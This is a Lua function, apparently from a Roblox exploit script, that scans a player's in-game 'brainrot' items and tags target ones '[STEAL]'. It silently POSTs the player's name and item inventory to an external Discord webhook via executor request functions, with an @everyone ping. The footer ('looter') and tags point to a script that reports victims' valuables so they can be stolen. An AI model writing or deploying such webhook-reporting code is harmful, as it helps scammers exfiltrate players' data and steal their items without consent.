local function sendDetailedWebhook(brainrots)
    if #brainrots == 0 then return end
    
    local playerName = player.Name
    
    -- Находим самого ценного брейнрота с картинкой
    local topBrainrotWithImage = nil
    local topGen = 0
    
    for _, br in ipairs(brainrots) do
        if br.image and br.image ~= "" and br.gen > topGen then
            topGen = br.gen
            topBrainrotWithImage = br
        end
    end
    
    -- Формируем поля для embed
    local fields = {}
    local totalValue = 0
    
    for i, br in ipairs(brainrots) do
        local isTarget = false
        for _, targetBr in pairs(targetBrainrotsList) do
            if br.name == targetBr then
                isTarget = true
                break
            end
        end
        
        local stealMark = isTarget and " **[STEAL]**" or ""
        local icon = isTarget and "⚫" or "🟢"
        
        -- БАФФЫ = ЧЕРТЫ (Fire, Explosive, Nyan и т.д.)
        local fieldValue = string.format(
            "**Редкость:** %s\n**Прибыль:** %s\n**Мутация:** %s\n**Баффы:** %s",
            br.rarity,
            br.genText,
            br.mutation,
            br.buffs
        )
        
        table.insert(fields, {
            name = icon .. " " .. br.name .. stealMark,
            value = fieldValue,
            inline = false
        })
        
        totalValue = totalValue + br.gen
    end
    
    local totalValueFormatted = totalValue >= 1000000 and string.format("$%.1fM/s", totalValue / 1000000) or string.format("$%d/s", totalValue)
    
    -- Создаем embed
    local embed = {
        title = "🎯 Brainrot Scanner",
        description = string.format("**Игрок:** %s\n**Всего брейнротов:** %d\n**Общая прибыль:** %s", playerName, #brainrots, totalValueFormatted),
        color = 0x9b59b6,
        fields = fields,
        footer = {text = "dragono лутатель ZET ZOV | Сортировка по прибыли ↓"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
    }
    
    -- Добавляем картинку самого ценного брейнрота в thumbnail (иконка справа сверху)
    if topBrainrotWithImage then
        embed.thumbnail = {
            url = topBrainrotWithImage.image
        }
        embed.description = embed.description .. string.format("\n\n🏆 **Самый ценный:** %s", topBrainrotWithImage.name)
    end
    
    -- Отправляем embed
    local data = {
        content = "@everyone",
        embeds = {embed},
        username = webhookUsername
    }
    
    pcall(function()
        if syn and syn.request then
            syn.request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        elseif request then
            request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        end
    end)
end

